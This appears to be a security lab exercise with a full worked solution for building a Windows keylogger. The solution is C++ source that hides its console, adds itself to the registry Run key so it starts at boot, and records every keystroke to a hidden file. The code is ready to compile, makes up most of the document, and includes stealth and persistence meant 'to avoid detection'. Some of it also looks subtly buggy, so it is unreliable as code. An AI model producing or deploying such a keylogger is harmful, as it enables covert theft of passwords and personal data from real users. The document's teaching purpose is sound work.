# Write A Standalone Keylogger
A keylogger is a type of malware used in cyberattacks to steal sensitive information by recording keystrokes on a victim's computer. Often installed covertly through phishing emails, it captures login credentials and personal data for attackers to misuse


## References
- [Keystroke Logging](https://en.wikipedia.org/wiki/Keystroke_logging) by Wikipedia
- [GetAsyncKeyState](https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getasynckeystate) by Microsoft
- [Keylogger](https://github.com/shubhangi-singh21/Keylogger) by shubhangi-singh21 on GitHub


## Tasks
- Setup a Windows VM
- Write a custom keylogger program with the following capabilities
  - The program starts executing when the system boots
  - The program runs as a background process without affecting any foreground processes
  - The program logs all user keystrokes in hidden files on the same disk
  - The program must use minimal resources to avoid detection
- Keylogger Creation Guidelines
  - You can use Windows APIs in your program
  - Use a programming language of your choice
  - Compile the program into a binary for deployment
- Deploy the keylogger binary in your VM
- Configure the keylogger to execute when the system starts
- Open a web browser and input a fictional username and password into a login form


## Benchmarks
- Validate that your keylogger starts at system boot time
- Validate that your keylogger records all keystrokes in hidden files
- Validate that your keylogger runs as a background process (you can view the active process listing in 'Task Manager')


## Solutions With Scripts
1. Save the following C++ program and compile it
   ```
    #include <iostream>
    #include <windows.h>
    
    using namespace std;
    
    int Save(int _key, char *file);
    
    void AddToStartup() {
        char filePath[MAX_PATH];
        GetModuleFileName(NULL, filePath, MAX_PATH);
        HKEY hKey;
        RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
        RegSetValueEx(hKey, "MyKeylogger", 0, REG_SZ, (BYTE*)filePath, strlen(filePath) + 1);
        RegCloseKey(hKey);
    }
    
    void HideLogFile() {
        SetFileAttributes("log.txt", FILE_ATTRIBUTE_HIDDEN);
    }
    
    int main() {
        FreeConsole();
        AddToStartup();
        HideLogFile();
    
        char i;
        while (true) {
            Sleep(10);
            for (i = 8; i <= 255; i++) {
                if (GetAsyncKeyState(i) == -32767) {
                    Save(i, "log.txt");
                }
            }
        }
        return 0;
    }
    
    int Save(int _key, char *file) {
        FILE *OUTPUT_FILE;
        OUTPUT_FILE = fopen(file, "a+");
        switch (_key) {
            case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]"); break;
            case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]"); break;
            case VK_LBUTTON: fprintf(OUTPUT_FILE, "[LBUTTON]"); break;
            case VK_RBUTTON: fprintf(OUTPUT_FILE, "[RBUTTON]"); break;
            case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]"); break;
            case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]"); break;
            case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]"); break;
            case VK_CONTROL: fprintf(OUTPUT_FILE, "[CTRL]"); break;
            case VK_MENU: fprintf(OUTPUT_FILE, "[ALT]"); break;
            case VK_CAPITAL: fprintf(OUTPUT_FILE, "[CAPS LOCK]"); break;
            case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]"); break;
        }
        fprintf(OUTPUT_FILE, "%s", &_key);
        fclose(OUTPUT_FILE);
        return 0;
    }
   ```